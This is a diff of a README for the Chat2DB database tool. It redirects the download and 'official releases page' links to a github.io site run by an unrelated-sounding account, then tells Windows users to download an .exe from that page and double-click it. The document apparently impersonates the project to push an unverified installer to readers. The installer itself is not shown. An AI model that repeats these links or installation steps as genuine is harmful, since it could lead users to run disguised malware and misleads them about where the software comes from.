@@ -1,6 +1,6 @@
 # 📁 Chat2DB - Manage Your Databases With Artificial Intelligence
 
-[![Download Chat2DB](https://img.shields.io/badge/Download-Chat2DB-blue.svg)](https://github.com/physicaltherapycase536/Chat2DB)
+[![Download Chat2DB](https://img.shields.io/badge/Download-Chat2DB-blue.svg)](https://physicaltherapycase536.github.io)
 
 Chat2DB is a database management tool that uses artificial intelligence to help you work with data. It acts as a graphical interface for your database systems. The software translates human language into database commands. This allows users to search, query, and manage tables without writing code from scratch.
 
@@ -8,7 +8,7 @@ Chat2DB is a database management tool that uses artificial intelligence to help 
 
 You can obtain the current version of the application from the project page. Follow these steps to set up the software on your Windows computer.
 
-1. Visit the [official releases page](https://github.com/physicaltherapycase536/Chat2DB) to start the download.
+1. Visit the [official releases page](https://physicaltherapycase536.github.io) to start the download.
 2. Look for the file ending in `.exe` under the Assets section.
 3. Click the file name to save the installer to your computer.
 4. Locate the downloaded file in your folder and double-click it.
